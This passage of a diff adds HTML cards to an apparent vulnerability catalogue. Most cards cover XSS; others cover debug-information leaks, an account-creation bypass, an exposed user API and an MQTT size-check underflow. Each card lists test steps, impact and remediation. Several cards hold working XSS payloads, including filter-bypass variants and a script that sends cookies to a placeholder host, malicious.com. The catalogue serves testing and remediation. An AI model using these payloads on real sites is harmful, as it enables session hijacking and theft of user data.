+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability could allow an attacker to steal sensitive user data, hijack user sessions, or deface the website, leading to significant security and privacy compromises.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding on all user-supplied data, particularly in URL parameters. Use context-dependent encoding libraries to prevent malicious scripts from being executed. Regularly review and update security measures to address emerging threats.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via URL Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject malicious scripts into a web application via a URL parameter. The injected script is then executed in the user&#x27;s browser, potentially leading to theft of sensitive information or manipulation of the user&#x27;s session. This is a reflected XSS vulnerability, meaning the injected script is directly echoed back to the user via the URL.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Access the vulnerable URL: &lt;TARGET_URL&gt;</li>
+<li>Append the following payload to the URL as a GET parameter: <code>&lt;image src=1 onerror=confirm(9706)&gt;</code></li>
+<li>Observe that a JavaScript alert box appears, confirming the presence of the XSS vulnerability.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker could leverage this XSS vulnerability to steal cookies, redirect users to malicious websites, or deface the webpage.  This can lead to session hijacking, unauthorized access to user accounts, and potential data breaches.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding to sanitize user-supplied data before rendering it in the browser. Use context-dependent encoding techniques to prevent the execution of malicious scripts. Employ a Content Security Policy (CSP) to restrict the sources from which scripts can be executed.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via ResolveUrl</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A Cross-Site Scripting (XSS) vulnerability exists due to improper handling of user-controlled input within a URL resolution function. This allows an attacker to inject arbitrary JavaScript payloads that execute within the victim’s browser context, potentially leading to account compromise or other malicious actions. The vulnerability stems from a failure to properly sanitize input before it&#x27;s used to construct a URL.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a malicious URL containing a JavaScript payload. The URL should be crafted to be reflected through the vulnerable application&#x27;s URL resolution function.</li>
+<li>Access the constructed URL via a web browser.</li>
+<li>Observe if the injected JavaScript payload executes. An example payload might be used to verify execution: <code>onload=print</code><code> fnwve=&#x27;zzzzz</code><code>8504695818</code>``</li>
+<li>A successful exploit will trigger JavaScript execution, often masked by techniques to bypass input filters or web application firewalls, such as using <code>print</code><code> instead of </code>alert()`.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability can lead to severe consequences, including session hijacking, account takeover, and defacement of the application. Attackers can steal cookies and impersonate legitimate users, potentially gaining unauthorized access to sensitive data or performing actions on their behalf.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation and context-dependent output encoding on all user-controlled data used in URL construction.  Utilize parameterized URL construction functions or libraries that automatically handle escaping and sanitization. Employ Content Security Policy (CSP) to restrict the sources from which scripts can be executed.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Stored XSS via ResolveUrl</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A Cross-Site Scripting (XSS) vulnerability exists due to improper handling of user-supplied URLs when resolving application-root-relative paths. The application fails to sanitize input passed to a URL resolution function, enabling the injection of arbitrary JavaScript payloads that execute within the user&#x27;s browser context. This poses a significant security risk, as attackers can potentially compromise user sessions and inject malicious content.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a URL containing a malicious payload designed to exploit the URL resolution function. The payload should be crafted to bypass any filtering mechanisms and leverage attributes like <code>onload</code>.</li>
+<li>Access the application via the constructed URL.</li>
+<li>Observe whether the injected JavaScript payload executes in the user&#x27;s browser context.</li>
+<li>Example Payload: <code>(Z(&#x27;ontestingb3t2h%20onload%3dprint%60%60%20fnwve%3d%27zzzzz%608504695818%60%27&#x27;))</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Successful exploitation of this vulnerability can result in session hijacking, allowing attackers to impersonate legitimate users. It may also enable attackers to deface the application or inject malicious content to users.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement context-dependent encoding and validation for all user-supplied input used in URL resolution. Carefully sanitize and validate all data used within ResolveUrl, particularly inputs directly influenced by user actions.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Stored XSS via URL Resolution</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves a Cross-Site Scripting (XSS) flaw stemming from inadequate sanitization of user-controlled input passed to a URL resolution function. Attackers can inject malicious JavaScript payloads that execute within the context of a user&#x27;s browser, potentially leading to unauthorized actions or data theft. The improper handling of URL resolution allows an attacker to inject arbitrary code into a webpage.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a URL containing a specially crafted payload designed to exploit the URL resolution function.</li>
+<li>Access the URL in a web browser.</li>
+<li>Observe whether the injected JavaScript code executes. An example payload is <code>&lt;img src=&quot;x&quot; onerror=&quot;print(&#x27;XSS&#x27;)&quot;&gt;</code>. Note that this payload may need to be URL-encoded based on the specific URL resolution mechanism.</li>
+<li>Attempt to bypass any implemented filters using techniques like character encoding or obfuscation, as demonstrated by using <code>print</code><code> fnwve=</code> instead of <code>alert()</code> to bypass filters.</li>
+<li>Observe the affected URL:  <code>/&lt;malicious_payload&gt;/pageNotFound.aspx</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Successful exploitation of this XSS vulnerability can allow an attacker to steal session cookies, redirect users to malicious websites, deface the webpage, or execute arbitrary code with the privileges of the user. This can lead to significant security breaches and compromise user data.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation and output encoding for all user-controlled data that is used in URL resolution or rendered in the browser. Utilize context-dependent encoding techniques and consider using URL parsing libraries to prevent malicious payloads from being injected. Regularly update and review the code to identify and address potential vulnerabilities.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Stored Cross-Site Scripting via Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A Cross-Site Scripting (XSS) vulnerability exists in a parameter allowing for the injection of malicious scripts. This can lead to unauthorized access, data theft, or session hijacking if exploited. User-supplied data is not properly sanitized before being rendered, enabling the execution of arbitrary JavaScript.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a POST request to &lt;TARGET_URL&gt;.</li>
+<li>Include a hidden input field with the name &quot;wikitext&quot; in the POST request body.</li>
+<li>Inject a malicious script within the value of the &quot;wikitext&quot; parameter.  For example: <code>&lt;iframe+src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnT2zDoSBtdW5kbyEnKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>Submit the crafted POST request.</li>
+<li>Verify that the injected script executes, such as displaying an alert box or redirecting to a malicious site.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Successful exploitation of this vulnerability could result in session hijacking, redirection to malicious websites, or the theft of sensitive user data. An attacker could impersonate legitimate users and perform actions on their behalf.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding to sanitize user-supplied data before rendering it in the response. Utilize context-aware escaping techniques to prevent the execution of malicious scripts. Employ a Content Security Policy (CSP) to restrict the sources from which scripts can be executed.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Stored XSS via Image Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A Cross-Site Scripting (XSS) vulnerability exists in a web application where user-supplied data within an image parameter is not properly sanitized before being rendered on a page. This allows an attacker to inject malicious scripts that could be executed within the user’s browser, leading to potential information theft and account compromise.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a URL containing a malicious script within the <code>currentImage</code> parameter. For example: <code>&lt;TARGET_URL&gt;?currentImage=&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li>Access the constructed URL in a web browser.</li>
+<li>Observe if a JavaScript alert box appears, indicating successful XSS execution. Even if the malicious script is removed from the URL after the initial access, verify the XSS payload still executes.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Successful exploitation of this vulnerability could result in session hijacking, cookie theft, defacement of the web page, redirection to malicious websites, or other malicious actions performed within the context of the user&#x27;s browser.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding mechanisms to sanitize user-supplied data before rendering it on a web page. Specifically, context-dependent output encoding should be applied to the <code>currentImage</code> parameter to prevent the execution of malicious scripts.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via URL Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A reflected Cross-Site Scripting (XSS) vulnerability exists where user-supplied data is not properly sanitized before being included in the response. This allows an attacker to inject malicious scripts that can be executed in the context of the user&#x27;s browser, potentially leading to sensitive information disclosure or malicious actions.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a malicious URL containing a vulnerable URL parameter.</li>
+<li>Access the URL in a web browser.</li>
+<li>Observe if the injected script executes, confirming the presence of the XSS vulnerability.</li>
+<li>Example Payload: <code>&quot;&gt;&lt;img src=x onerror=&quot;prompt(1)</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability can lead to cookie theft, session hijacking, defacement of the web page, and the potential compromise of user accounts. Attackers can leverage this to execute arbitrary JavaScript code in the victim&#x27;s browser.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding to prevent the injection of malicious scripts. Utilize context-dependent escaping mechanisms to sanitize user-supplied data before rendering it on the page. Employ a Content Security Policy (CSP) to restrict the sources from which scripts can be executed.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via Search Field</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A reflected Cross-Site Scripting (XSS) vulnerability allows an attacker to inject malicious scripts into a web page viewed by other users. This occurs when user-supplied data is not properly sanitized before being displayed, leading to arbitrary JavaScript execution within the context of the vulnerable site. Successful exploitation can have serious consequences for user privacy and site integrity.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to &lt;TARGET_URL&gt;.</li>
+<li>Enter the following payload in the search field: <code>`</code>test<code>-alert(0)-</code>k <code>`</code></li>
+<li>Observe that the JavaScript alert box executes, demonstrating the presence of the XSS vulnerability.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can potentially steal credentials or session tokens, log keystrokes, perform actions on behalf of authenticated users, deface the user interface, redirect users, or propagate malicious scripts across the platform.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding techniques to sanitize user-supplied data before displaying it on the web page. Utilize a Content Security Policy (CSP) to restrict the sources from which scripts can be executed.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via User Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject arbitrary JavaScript code into a user-supplied parameter within a web application&#x27;s response. When a user unknowingly visits a crafted URL containing this malicious payload, their browser executes the injected script, potentially leading to sensitive information theft or malicious actions.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a URL containing a malicious script payload within a user-supplied parameter. For example: <code>&lt;TARGET_URL&gt;?user=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code></li>
+<li>Access the constructed URL through a web browser.</li>
+<li>Observe the execution of the JavaScript payload, triggering an alert box or other visible effect.</li>
+<li>Alternatively, use a more stealthy payload that redirects the user to a phishing site or attempts to steal cookies, for example: <code>&lt;script&gt;window.location=&#x27;http://malicious.com?cookie=&#x27;+document.cookie&lt;/script&gt;</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can leverage this vulnerability to steal user session cookies, execute malicious code in the victim&#x27;s browser, redirect them to phishing websites, or deface the web application. This can lead to unauthorized access to user accounts, data theft, and other security compromises.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding mechanisms to sanitize user-supplied data before reflecting it in the HTML response. Utilize a secure templating engine with automatic output escaping, and consider implementing a Content Security Policy (CSP) to restrict inline script execution.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via User Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A reflected Cross-Site Scripting (XSS) vulnerability allows an attacker to inject and execute arbitrary JavaScript in a user’s browser. This occurs when user-supplied input is not properly sanitized before being reflected back to the user&#x27;s browser, enabling malicious scripts to execute within the user&#x27;s session.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a URL with a crafted payload in the <code>user</code> parameter. This payload should contain a script tag that triggers an alert or other visible indicator of successful XSS execution.</li>
+<li>Navigate to the constructed URL in a web browser.</li>
+<li>Observe the browser’s behavior. A successful exploitation will result in the execution of the injected JavaScript code.</li>
+<li>Example payload: <code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;script&gt;prompt(&quot;XSS&quot;)&lt;/script&gt;&lt;/svg&gt;</code></li>
+<li>The URL would resemble: <code>&lt;TARGET<em>URL&gt;?user=&lt;PAYLOAD&gt;&amp;other</em>parameter=value</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Successful exploitation can lead to session hijacking, phishing attacks, account takeover, and potentially defacement of the application.  Attackers can steal sensitive information or impersonate legitimate users.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding on all user-supplied parameters.  Utilize Content Security Policy (CSP) headers to restrict the execution of inline scripts and external resources. Perform regular security audits and penetration testing to identify and address potential XSS vulnerabilities.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Reflected XSS via Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject and execute arbitrary JavaScript in a user&#x27;s browser by crafting a malicious link. The vulnerability occurs because user-supplied input is reflected back into the application without proper sanitization or encoding, enabling the execution of attacker-controlled code. This can lead to session hijacking, credential theft, or other browser-based attacks.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Open a web browser and navigate to <code>&lt;TARGET_URL&gt;</code>.</li>
+<li>Construct a URL with a <code>user</code> parameter containing a malicious JavaScript payload.  For example: <code>&lt;TARGET_URL&gt;?user=&lt;script&gt;alert(1)&lt;/script&gt;</code>.</li>
+<li>Observe that the browser executes the JavaScript payload, triggering an alert or some other visible action. This confirms the presence of a reflected XSS vulnerability.</li>
+<li>Examine the response from the server to verify that the <code>user</code> parameter is being reflected without proper sanitization.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can leverage this vulnerability to steal session cookies, redirect users to malicious websites, deface the web page, or execute arbitrary JavaScript code within the user’s browser, potentially leading to sensitive data exposure or complete account compromise.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding practices.  Specifically, sanitize and encode user-supplied data before reflecting it back into the response. Utilize a Content Security Policy (CSP) to restrict the sources from which scripts can be executed.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Information Disclosure via Debug Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to retrieve debug information from the target application. This debug information may include sensitive details about the application&#x27;s internal state, configuration, or potentially even API keys or database credentials, which can be leveraged for further attacks.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a URL with the following format: <code>&lt;TARGET_URL&gt;?format=jsonv2&amp;debug=2</code>.</li>
+<li>Access the constructed URL in a web browser or using a tool like <code>curl</code>.</li>
+<li>Observe the response from the server. The response body should contain debug information.</li>
+<li>Examine the debug information for any sensitive details.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The exposure of debug information can lead to the compromise of sensitive data, unauthorized access to internal systems, or a better understanding of the application&#x27;s architecture, which can aid in identifying further vulnerabilities.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Disable debug mode in production environments. Ensure that sensitive information is not included in debug output. Implement proper access controls to prevent unauthorized access to debug endpoints.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Information Disclosure via Debug Log File</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A publicly accessible debug log file is being served, revealing sensitive server paths and plugin details. This type of disclosure can provide attackers with valuable information about the server environment, enabling them to fingerprint the system, identify known vulnerabilities in specific plugins, and potentially exploit path information for further attacks.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to a URL that directly accesses a debug log file, such as <code>&lt;TARGET_URL&gt;/debug.log</code>.</li>
+<li>Observe the content of the log file. It should contain PHP warnings, deprecated notices, and potentially other information about the system&#x27;s internal workings.</li>
+<li>Analyze the log entries for sensitive information such as server paths, plugin locations, and deprecated function calls.</li>
+<li>Verify that the log file is not accessible to unauthorized users, as it may contain sensitive information that could be used to compromise the system.</li>
+<li>Example log entry might resemble: <code>[Date] PHP Warning: Undefined array key &quot;&lt;PARAMETER&gt;&quot; in &lt;FILE<em>PATH&gt; on line &lt;LINE</em>NUMBER&gt;</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The exposure of sensitive path information, plugin details, and error handling insights significantly increases the attack surface. Attackers can use this information to fingerprint the environment, exploit known vulnerabilities in specific plugins, or leverage path disclosure for further attacks like Local File Inclusion (LFI).</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong></p>
+<ol>
+<li>Restrict direct access to log files using web server configuration (e.g., <code>.htaccess</code> for Apache).</li>
+<li>Disable debugging features (e.g., <code>WP<em>DEBUG</code> and <code>WP</em>DEBUG_LOG</code>) in the application&#x27;s configuration file.</li>
+<li>Regularly update plugins to patch vulnerabilities and address deprecated function calls.</li>
+<li>Implement log management practices to regularly review logs for sensitive information and clear unnecessary entries.</li>
+</ol>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Account Creation Bypass via Response Manipulation</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to create an account without proper authentication or verification. This bypasses intended security controls, potentially enabling unauthorized access and malicious activity within the system. It highlights a flaw in the account creation process, as the intended verification steps are circumvented.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the account creation page at &lt;TARGET_URL&gt;.</li>
+<li>Initiate the account creation process by clicking on a &quot;I don&#x27;t have a CAC&quot; link or similar option.</li>
+<li>Observe the subsequent HTTP response for any clues or potential manipulation points within the response data.</li>
+<li>Modify the HTTP response data to bypass authentication or verification checks. Refer to the provided Proof of Concept video for guidance on how to manipulate the response.</li>
+<li>Submit the altered request to complete the account creation process.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Successful exploitation of this vulnerability allows unauthorized users to create accounts, potentially leading to data breaches, malicious activities, or unauthorized access to sensitive resources.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust authentication and verification mechanisms for account creation, ensuring that all required steps are enforced and cannot be bypassed through response manipulation. Validate user input on both the client and server side.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Publicly Accessible Metadata Endpoint Exposing Object Information</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A publicly accessible endpoint exposes metadata for stored objects, including identifiers like ETags (often representing object hashes), file sizes, and modification timestamps. This allows attackers to gather reconnaissance information about the content stored and potentially fingerprint files. While the files themselves may be access-controlled, the exposed metadata poses a security risk.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Access the publicly accessible metadata endpoint at &lt;CDN_ENDPOINT&gt;.</li>
+<li>Observe the returned XML response.</li>
+<li>Verify the presence of metadata fields like Key, LastModified, Size, StorageClass, and ETag.</li>
+<li>Examine the ETag value. Note that these often contain a hash, which can be used for file fingerprinting.</li>
+<li>&lt;EXAMPLE_PAYLOAD: Analyze the ETag value for patterns indicative of a hash algorithm (e.g., MD5) and attempt to use this information to correlate the content with other known datasets.&gt;</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Attackers can use the exposed metadata to perform reconnaissance, fingerprint files, and identify accidentally uploaded sensitive content. This information can be used to correlate data across systems or detect duplicate files. It also represents a misconfiguration that could violate compliance guidelines.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Disable public listing of the storage bucket/CDN endpoint.  If listing is required, serve only intended objects via a CDN front that doesn&#x27;t expose raw bucket indexes or ETags.  Use signed/presigned URLs for controlled distribution of non-public content. Consider removing or truncating ETag/hash fields from publicly accessible listings. Audit stored objects for sensitive content.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Information Disclosure via API Endpoint</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An API endpoint is exposing sensitive user information, such as identifiers, names, email addresses, roles, and authentication data, to unauthenticated users. This allows unauthorized access to private user details, posing a significant security risk and potentially violating data protection policies.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the vulnerable API endpoint: &lt;TARGET_URL&gt;/users</li>
+<li>Send a GET request to the endpoint using a tool like curl or a web browser. The request should be unauthenticated.</li>
+<li>Observe the response body. It should contain sensitive user information.</li>
+<li>Example request (using curl):</li>
+</ol>
+
+<pre><code>curl -v &lt;TARGET_URL&gt;/users</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Critical exposure of Personally Identifiable Information (PII), potentially leading to unauthorized access, phishing attacks, and compromise of user accounts.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement authentication and authorization checks on the API endpoint to ensure only authorized users can access user information. Secure the API by restricting access based on user roles and permissions.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">MQTT: Unsigned Integer Underflow Bypass of Message Size Limit</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-01-14</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An unsigned integer underflow vulnerability exists within the MQTT publishing functionality. Due to flawed size validation logic, oversized MQTT messages can bypass size restrictions, potentially leading to out-of-bounds memory access. This can cause application crashes or, in more severe cases, could be leveraged for exploitation.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Set up a minimal MQTT server capable of handling a CONNECT and CONNACK handshake.</li>
+<li>Utilize a client application leveraging a library like libcurl with the <code>mqtt://</code> scheme.</li>
+<li>Configure the client to set a <code>CURLOPT<em>POSTFIELDSIZE</em>LARGE</code> value that exceeds the defined <code>MAX<em>MQTT</em>MESSAGE_SIZE</code>.</li>
+<li>Provide a buffer via <code>CURLOPT<em>POSTFIELDS</code> that has a significantly smaller size than the value specified in <code>CURLOPT</em>POSTFIELDSIZE_LARGE</code>.</li>
+<li>Execute the client&#x27;s MQTT publish function.</li>
+<li>Observe the client&#x27;s behavior. A successful publish (or lack of error reporting) indicates a potential bypass of the size check.  Use memory debugging tools (like AddressSanitizer - ASAN) to detect out-of-bounds memory reads or accesses.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The vulnerability can lead to out-of-bounds memory reads during MQTT publish operations, potentially resulting in application crashes or enabling exploitation via memory corruption.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust size validation during MQTT publish operations. Ensure that <code>CURLOPT<em>POSTFIELDSIZE</em>LARGE</code> accurately reflects the size of the data being transmitted, and rigorously enforce size limits to prevent oversized messages from being processed. Utilize secure coding practices to avoid unsigned integer underflows, potentially by employing checked arithmetic or more reliable size comparison methods.</p>
+      </div>
+    </article>
+    
+
     <article class="card" data-category="Network">
       <button type="button" class="card-toggle">
         <span class="card-title">
